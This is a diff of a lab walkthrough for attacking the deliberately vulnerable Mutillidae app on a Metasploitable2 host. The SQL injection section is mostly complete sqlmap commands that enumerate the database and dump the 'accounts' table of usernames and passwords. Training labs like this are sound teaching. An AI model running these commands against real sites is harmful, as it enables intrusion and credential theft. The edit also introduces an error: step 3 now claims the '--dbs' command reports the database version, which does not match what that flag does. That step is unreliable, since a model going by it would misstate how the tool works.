@@ -224,7 +224,7 @@ Include and execute files hosted on an external server (your attacker machine) b
 
 ![RFI Vulnerability Output Placeholder](/images/rfi_output.png)
 
-#### Step 5: Cross-Site Scripting (XSS) Vulnerabilities (To Be Documented)
+#### Step 5: Cross-Site Scripting (XSS) Vulnerabilities
 Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users. This can lead to session hijacking, website defacement, or redirection to malicious sites. We will explore two types: Reflected XSS and Stored XSS.
 
 ##### 5.1 Reflected XSS
@@ -397,27 +397,32 @@ SQL Injection (SQLi) is a web security vulnerability that allows an attacker to 
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details"`
     -   **Expected Outcome:** `sqlmap` will identify the injectable parameters.
 
-3.  **Enumerate Databases:**
-    List all available databases on the target server.
+3.  **Identify Database Information and Version:**
+    Determine the database technology currently in use and its version.
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --dbs`
-    -   **Expected Outcome:** `sqlmap` will list databases like `owasp10`, `information_schema`, etc.
+    -   **Expected Outcome:** `sqlmap` will output the database system used and its version such as `mssql`, `mysql`, `postgresql`, etc.
 
-4.  **Identify Current Database:**
+4.  **Identify Current Database User:**
+    Determine the database user.
+    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --current-user`
+    -   **Expected Outcome:** `sqlmap` will output the database user.
+
+5.  **Identify Current Database:**
     Determine the database currently in use by the application.
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --current-db`
     -   **Expected Outcome:** `sqlmap` will output the current database, likely `owasp10`.
 
-5.  **Enumerate Tables in a Database:**
+6.  **Enumerate Tables in a Database:**
     List all tables within the `owasp10` database.
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --tables -D owasp10`
     -   **Expected Outcome:** `sqlmap` will list tables like `accounts`, `credit_cards`, etc.
 
-6.  **Enumerate Columns in a Table:**
+7.  **Enumerate Columns in a Table:**
     List all columns within the `accounts` table in the `owasp10` database.
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --columns -T accounts -D owasp10`
     -   **Expected Outcome:** `sqlmap` will list columns like `cid`, `username`, `password`, `mysignature`, `is_admin`.
 
-7.  **Dump Data from a Table:**
+8.  **Dump Data from a Table:**
     Extract all data from the `accounts` table.
     -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --dump -T accounts -D owasp10`
     -   **Expected Outcome:** `sqlmap` will dump all entries, including usernames and passwords, from the `accounts` table.
